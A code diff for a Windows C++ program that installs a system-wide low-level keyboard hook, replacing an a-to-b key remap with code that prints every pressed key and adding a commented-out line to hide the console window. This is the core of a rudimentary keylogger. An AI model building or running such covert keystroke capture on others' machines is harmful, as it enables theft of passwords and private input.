@@ -1,5 +1,7 @@
+#include <iostream>
 #include <windows.h>
-#include <cstdio>
+
+using namespace std;
 
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
@@ -7,28 +9,11 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 
     if (nCode == HC_ACTION)
     {
-        switch (wParam)
+        PKBDLLHOOKSTRUCT press = (PKBDLLHOOKSTRUCT)lParam;
+        DWORD vkCode = press->vkCode; // Get the virtual keycode
+        if ((wParam == WM_KEYDOWN) || (wParam == WM_SYSKEYDOWN)) // Keydown
         {
-            case WM_KEYDOWN:
-            case WM_SYSKEYDOWN:
-            case WM_KEYUP:
-            case WM_SYSKEYUP:
-                PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
-                if (fEatKeystroke = (p->vkCode == 0x41))  //redirect a to b
-                {
-                    printf("Hello a\n");
-
-                    if ( (wParam == WM_KEYDOWN) || (wParam == WM_SYSKEYDOWN) ) // Keydown
-                    {
-                        keybd_event('B', 0, 0, 0);
-                    }
-                    else if ( (wParam == WM_KEYUP) || (wParam == WM_SYSKEYUP) ) // Keyup
-                    {
-                        keybd_event('B', 0, KEYEVENTF_KEYUP, 0);
-                    }
-                    break;
-                }
-                break;
+            cout << (char)vkCode << endl;
         }
     }
     return(fEatKeystroke ? 1 : CallNextHookEx(NULL, nCode, wParam, lParam));
@@ -36,6 +21,8 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 
 int main()
 {
+    // Hidding console window while executing
+    //ShowWindow(GetConsoleWindow(), SW_HIDE);
 
     // dwThreadId is set to 0 to make all programs to be hooked
     HHOOK hookLowLevelKeyboard = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
